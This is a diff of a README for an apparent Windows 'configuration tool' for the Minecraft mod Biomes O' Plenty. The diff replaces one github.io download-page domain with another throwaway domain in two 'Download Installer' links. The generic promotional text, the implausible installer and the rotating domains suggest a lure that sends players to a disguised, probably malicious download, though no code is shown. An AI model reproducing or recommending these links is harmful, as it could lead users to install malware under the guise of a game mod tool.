@@ -2,7 +2,7 @@
 
 Biomes O' Plenty is a renowned Minecraft mod that introduces a wide variety of biomes, enhancing the game's world generation. This configuration tool for Windows 10/11 allows players to easily manage and customize settings for Biomes O' Plenty, including shader packs and mod configurations, ensuring an optimized gaming experience in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup--latest15.07-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -73,7 +73,7 @@ If you encounter issues during installation or usage:
 
 To get the latest version of the Biomes O' Plenty Configuration Tool, visit the download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## License and Disclaimer
 
